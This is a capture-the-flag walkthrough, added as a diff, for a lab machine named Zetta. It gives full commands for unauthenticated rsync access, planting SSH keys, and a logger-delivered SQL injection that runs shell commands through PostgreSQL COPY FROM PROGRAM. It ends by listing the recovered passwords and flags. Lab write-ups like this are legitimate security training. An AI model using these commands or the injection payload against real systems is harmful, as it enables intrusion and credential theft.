@@ -1,0 +1,57 @@
+With the namp scan we get only 3 ports open, 21 ( FTP running Pure-FTPd ), 22 ( SSH ) and 80 ( Web )
+
+Looking into the port 80.
+On the first scan we get that Zetta is a sharing service based on the FTP protocol. Searching more in depth of the web file we find a set of credentials that are generated randomly every time we reload the page. 
+Run a gobuster process but nothing usefull comes up. 
+
+Loging in the FTP service.
+From the web script we get that each and every combination of 32 chars will working when trying to login into the ftp. So we run `ftp 10.10.10.156` and than pass `QAb2VYdiJb77F9HUThtNRemWkP6uaQkg` on the username and password fied. 
+In the welcome message we figure out that `IPv6 connections are also welcome on this server.`. Let's try to switch to that since there is nothing interesting in there. 
+To do this, we should use the `EPRT` command. Start a new raw session using `nc -v 10.10.10.156 21` and than authentificate with `USER` and `PASS` commands. Thank follow the sequence. Before using the `LIST` command stat `tcpdump -lni tun0 -vvvvvvv ip6`
+Now we got the IPv6 adress. Let's nmap it
+
+With the new IPv6 adress we need to use the `-6` tag on nmap, and on the full port scan we get a new port, 8730. This seems to be rsync, an app which syncs the files on UNIX systems.
+
+Exploiting the RSYNC ( 8730 ) 
+We first try with the telnet session and get a greeting message, but we can't do a thing here.
+Trying the metasploit module called `auxiliary/scanner/rsync/modules_list` we get 9 modules `bin, boot, lib, lib64, opt, sbin, srv, usr, var`
+Now we try to login into the rsync to extract some data from these modules, but when we fire up the `rsync -av6 rsync://[dead:beef::250:56ff:feb9:6611]:8730/etc data` and we get the whole directory. Let's go searching it.
+
+Forensics on the recieved data
+With the whole etc file synced on our machine, we get quite some information. First of all checking the rsyncd.conf we got that the username is `roy`  
+
+Starting the bruteforce.
+Now we need to get the roy's password. Because there is no script online that supports rsync cracking over ipv6 we need to make a custom one. I decided to do this by using the `pexpect` python library. The result of this can be found in `rsyncBruteforcePassword.py` 
+Let's reuse the command in the script and download the roy's home directory. And we got the user flag. 
+Trying to get a shell using rsync
+Looking over into the config file we see that we have read/write access to the `home_roy` directory. Let's add our ssh keys to the `authorized_keys` on the machine. First we create new ones using `ssh-keygen -t rsa` 
+Upload them to the remote host using rsync `rsync -a .ssh rsync://roy@[dead:beef::250:56ff:feb9:6611]:8730/home_roy` and set the permissions `rsync --rsync-path="chmod 700 authorized_keys" rsync://roy@[dead:beef::250:56ff:feb9:6611]:8730/home_roy/.ssh`
+Now let's login `ssh -i zettaKeys roy@10.10.10.156` and we have a stable shell.
+
+Enum the machine.
+From the .tudo.xml we get that user has setup a service which syslog, which could either be syslog-ng or rsyslog. The `ps aux` is short, so we need to check it in another way. To do this, we can use the systemctl process. Checking both we get positive result on rsyslog, the cmd that I used being `systemctl status rsyslog`.
+Now we aslo know that it has some integration with postgresql.  
+In the `/etc/rsyslog.d` we got a git repository. Looking into the .git folder we got nothing. But when we try a `git show` to see the last changes we get a password and a user.
+We should find a cmd that is implemented with `logger` 
+Craft the payload `logger -p local7.info "pg_exec',\$\$2019-09-01 07:55:02\$\$); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \$\$cp /var/lib/postgresql/.ssh/id_rsa /tmp/l; chmod 777 /tmp/l \$\$; -- "` and now we get the ssh login for postgresql.
+
+Search the postgres user.
+First, to login into the postgres user you must set `chmod 600 postgres_rsa` and than just ssh it, `ssh -i postgresql_rsa postgres@10.10.10.156`
+Remember that password schema that roy told us he need to change? Well, using the intel from `.psql_history`, we try to use the password `sup3rs3cur3p4ass@root` over the `su -` and we pwned the box.
+
+Rooted, one of the most interesting boxes I've ever done!
+
+Credentials:
+-> roy:computer ( rsync only )
+-> root:sup3rs3cur3p4ass@root
+
+Flags:
+-> USER: a575bdb345f2de0a3172c8282452be91
+-> ROOT: b9407e837fb779abc934d6db89ed4c42
+
+Articles that I've used:
+-> http://blaszczakm.blogspot.com/2019/10/obtaining-ipv6-address-from-ftp-ipv4.html ( RFC2428 )
+-> https://www.smeegesec.com/2016/12/pentesting-rsync.html ( RSYNC ) 
+-> https://pexpect.readthedocs.io/en/stable/overview.html#special-eof-and-timeout-patterns ( rsync bruteforce ) 
+-> https://likegeeks.com/linux-syslog-server-log-management/ ( Rsyslog ) 
+-> https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5#targetText=Authenticated%20Arbitrary%20Command%20Execution%20on%20PostgreSQL%209.3%20%3E%20Latest&targetText=PostgreSQL%2C%20commonly%20known%20as%20Postgres,Linux%20and%20Windows%20versions%20available. ( Postgresql injection )
